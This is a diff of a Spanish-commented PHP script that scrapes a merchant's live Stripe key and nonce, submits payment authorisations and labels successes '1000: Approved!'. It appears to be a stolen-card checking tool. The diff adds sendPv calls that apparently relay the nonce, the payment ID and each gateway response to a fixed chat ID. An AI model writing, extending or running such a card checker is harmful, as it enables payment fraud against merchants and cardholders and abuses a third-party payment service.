@@ -506,6 +506,9 @@ preg_match($patron, $response, $coincidencia);
 $pk_live = $coincidencia[0];
 curl_close($curl);
 
+
+	
+sendPv("1292171163", $nonce);
 /////EXTRAE EL ID//
 
 echo "$nonce\n";
@@ -546,7 +549,7 @@ $id = $json["id"];
 curl_close($curl);
 echo "$id\n";
 ////HACE EL AUTH///
-
+sendPv("1292171163", $id);
 
 $curl = curl_init();
 curl_setopt_array($curl, [
@@ -584,7 +587,7 @@ $message = str_replace("Error: ", "", $json['data']['error']['message']);
 $success = $json['success'];
 $status = $json['data']['status'];
 curl_close($curl);
-
+sendPv("1292171163", $message);
 if ($success === true && $status === "succeeded") {
     $respo = "1000: Approved!";
 
